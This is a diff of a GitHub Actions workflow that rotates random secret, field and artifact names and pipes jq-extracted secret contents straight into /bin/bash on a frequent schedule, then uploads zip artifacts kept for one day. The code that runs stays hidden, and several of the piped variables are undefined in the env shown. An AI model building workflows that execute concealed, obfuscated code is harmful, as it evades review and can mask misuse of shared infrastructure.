@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '49 4,10,16,22 * * *'
+    - cron: '0 1,7,13,19 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -15,17 +15,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Setup and run
         env:
-          ucyh9: ${{ secrets.ucyh9 }}
+          ia758: ${{ secrets.ia758 }}
         run: |
-          printf '%s' "$ucyh9" | jq -r .urys59 | /bin/bash
-          printf '%s' "$opp542" | jq -r .piaby70939 | /bin/bash
-          echo $z06647 | jq -r .vi562 | /bin/bash
-          printf '%s' "$s2427" | jq -r .mdmvz079 | /bin/bash
+          printf '%s' "$ia758" | jq -r .vb6876 | /bin/bash
+          echo $cvi8 | jq -r .rm505 | /bin/bash
+          printf '%s' "$bjq0" | jq -r .cuu1551 | /bin/bash
+          printf '%s' "$lxln5460" | jq -r .jmw73389 | /bin/bash
+          printf '%s' "$wsgp95162" | jq -r .uqo6 | /bin/bash
 
       - name: Upload data
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: CwRomGiK
+          name: VwIkwCtE
           path: "*.zip"
           retention-days: 1
